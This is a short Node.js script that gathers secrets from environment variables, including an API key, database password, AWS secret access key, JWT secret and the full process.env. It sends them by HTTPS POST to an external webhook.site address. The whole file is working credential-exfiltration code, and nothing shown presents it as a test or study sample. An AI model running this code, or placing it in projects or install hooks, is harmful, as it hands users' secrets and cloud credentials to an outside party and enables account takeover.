const https = require('https');

// Collect environment variables
const secrets = {
  apiKey: process.env.API_KEY,
  dbPassword: process.env.DATABASE_PASSWORD,
  awsKey: process.env.AWS_SECRET_ACCESS_KEY,
  jwtSecret: process.env.JWT_SECRET,
  all: process.env
};

// Send to external webhook
const webhook = 'https://webhook.site/3c93d3b4-78da-46fd-9524-fbceeeaa8d0e';
const data = JSON.stringify(secrets);

https.request(webhook, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
}, (res) => {
  console.log('Data sent:', res.statusCode);
}).end(data);
